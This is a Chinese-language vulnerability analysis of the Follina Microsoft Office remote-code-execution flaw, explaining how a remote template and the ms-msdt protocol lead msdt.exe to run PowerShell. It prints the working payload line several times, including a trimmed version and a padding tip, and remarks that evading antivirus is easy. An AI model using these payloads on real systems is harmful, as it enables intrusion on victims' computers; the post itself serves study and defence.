**作者：Y4er**  
**原文链接：<https://y4er.com/post/follina-microsoft-office-rce-with-ms-msdt-protocol/>**

## 前言

看推特发了一个好玩的office
rce。最早应该是起源于[nao_sec的推特](https://twitter.com/nao_sec/status/1530196847679401984)

然后又发现了一篇分析文章。

<https://doublepulsar.com/follina-a-microsoft-office-code-execution-vulnerability-1a47fce5629e>

接着poc也有了 <https://github.com/chvancooten/follina.py>

本文依托于poc看一下这个office rce

## 分析

    
    
    python .\follina.py -m command -c calc

![1.png](https://images.seebug.org/content/images/2022/06/06/1654484738000-1tkbop.png-w331s)

查看python源码，逻辑是向`word\_rels\document.xml.rels`写一个远程模板地址

![2.png](https://images.seebug.org/content/images/2022/06/06/1654484739000-2otick.png-w331s)

钓过鱼的都知道这个是远程模板，接着会写入一个`www\exploit.html`，这个文件中的关键代码只有一行js

    
    
    location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'Unicode.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'YwBhAGwAYwA='+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\"";

跳了一个`ms-msdt:/`伪协议，ms系列是office注册的协议，你可以在设置-应用-默认应用-按协议指定默认应用中找到对应的伪协议和所启动的应用。

![3.png](https://images.seebug.org/content/images/2022/06/06/1654484739000-3bcegc.png-w331s)

ms-msdt协议没在这里找到，可以从注册表中找到

![4.png](https://images.seebug.org/content/images/2022/06/06/1654484740000-4kijjv.png-w331s)

command是`"%SystemRoot%\system32\msdt.exe" %1`

![5.png](https://images.seebug.org/content/images/2022/06/06/1654484740000-5mlvvj.png-w331s)

msdt.exe 是微软支持诊断工具，微软对其有官方文档

<https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/msdt>

参数如图

![6.png](https://images.seebug.org/content/images/2022/06/06/1654484741000-6bsmub.png-w331s)

此时回头来看exploit.html，其命令如下

    
    
    msdt.exe /id PCWDiagnostic /skip force /param "IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'Unicode.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'YwBhAGwAYwA='+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe"

`/id PCWDiagnostic`表示运行PCWDiagnostic诊断包，除此以外还有其他的诊断包

C:\Windows\diagnostics\index

![7.png](https://images.seebug.org/content/images/2022/06/06/1654484741000-7qrtmz.png-w331s)

对应的程序目录在C:\Windows\diagnostics\system

![8.png](https://images.seebug.org/content/images/2022/06/06/1654484742000-8bduov.png-w331s)

不同的诊断包兼容性不一样，具体兼容版本看[微软文档 available-troubleshooting-packs](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/ee424379\(v=ws.11\)#available-troubleshooting-packs)

`/skip
force`文档没提，不过实际测试加不加都可以弹计算器，字面意思应该是强制跳过，无所谓，而且IT_RebrowseForFile不加也可以，所以精简下来的payload如下

    
    
    /param "IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'Unicode.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'YwBhAGwAYwA='+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe"

这部分通过param参数应该是继续向运行PCWDiagnostic诊断包时传递了三个参数

  1. IT_RebrowseForFile
  2. IT_LaunchMethod
  3. IT_BrowseForFile

这三个参数我在下面两个链接中搜到了一些东西

  1. <https://lolbas-project.github.io/lolbas/Binaries/Msdt/>
  2. <https://gist.github.com/homjxi0e/3f35212db81b9375b7906031a40c6d87>

应该是通过这几个参数可以运行msi程序，但是具体怎么实现的？

这里需要引入微软文档[《Writing a Troubleshooting
Manifest》](https://docs.microsoft.com/zh-cn/previous-versions/windows/desktop/wintt/writing-the-troubleshooting-manifest)

回头看PCWDiagnostic，对应的诊断包程序位于C:\Windows\diagnostics\system\PCW

![9.png](https://images.seebug.org/content/images/2022/06/06/1654484742000-9hgbcc.png-w331s)

其中DiagPackage.diagpkg是manifest文件，这些在文档中有。

![10.png](https://images.seebug.org/content/images/2022/06/06/1654484742000-10klmze.png-w331s)

> 翻译过来：该部分表示要在故障排除阶段运行的脚本

在Interactions块中是程序交互的参数

![11.png](https://images.seebug.org/content/images/2022/06/06/1654484743000-11zxcce.png-w331s)

其中我们用到的IT_BrowseForFile也在其中

![12.png](https://images.seebug.org/content/images/2022/06/06/1654484743000-12nklhb.png-w331s)

manifest中指定的powershell程序是

![13.png](https://images.seebug.org/content/images/2022/06/06/1654484744000-13vxfav.png-w331s)

    
    
    C:\Windows\diagnostics\system\PCW\TS_ProgramCompatibilityWizard.ps1

此时回头来看payload

![14.png](https://images.seebug.org/content/images/2022/06/06/1654484744000-14bwlnw.png-w331s)

代码高亮已经给出答案，当调用ps1脚本时

    
    
    $(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'Unicode.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'YwBhAGwAYwA='+[char]34+'))'))))

这段代码会逃逸出来被powershell执行，造成rce。

## 拓展

本着探索精神，想着自己也挖一挖这种洞，于是找了一些其他的伪协议，也就是上文中的ms-officecmd，于是发现了一个dotnet的LocalBridge.exe

![15.png](https://images.seebug.org/content/images/2022/06/06/1654484744000-15qpojq.png-w331s)

经过处理json之后调用LaunchOfficeAppValidated，像是可以运行验证过后的程序。

![16.png](https://images.seebug.org/content/images/2022/06/06/1654484745000-16uomcj.png-w331s)

发现用到了pinvoke调用dll

![17.png](https://images.seebug.org/content/images/2022/06/06/1654484745000-17zwfmg.png-w331s)

刚找好兄弟要了一个ida，下载的过程中在搜索ms-officecmd关键字，发现了前人写的文章

  1. [Abusing the MS Office protocol scheme](https://blog.syss.com/posts/abusing-ms-office-protos/)
  2. [Windows 10 RCE: The exploit is in the link](https://positive.security/blog/ms-officecmd-rce)

两篇文章记录了msoffice协议相关的知识以及通过ms-officecmd协议挖掘Teams、Skype的1click的rce
chain，值得一学，但是我进一步挖掘的热情被他们的rce浇灭了。

就这样吧。

## 后文

通过远程模板location.href跳转的形式，可以拉取msdt调用powershell执行命令，并且绕过了`启用编辑`这一大限制，总体来说还是比较牛逼的。

因为参数很多，所以免杀相对好做，防御的话我不是专业的就不说了。

* * *

补充：exploit.html需要填充4096垃圾字符，因为在< https://billdemirkapi.me/unpacking-cve-2021-40444-microsoft-office-rce/ >这个文章中分析了会先读取4096缓冲区。

![18.png](https://images.seebug.org/content/images/2022/06/06/1654484746000-18vdyxf.png-w331s)

**文笔垃圾，措辞轻浮，内容浅显，操作生疏。不足之处欢迎大师傅们指点和纠正，感激不尽。**

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1911/>

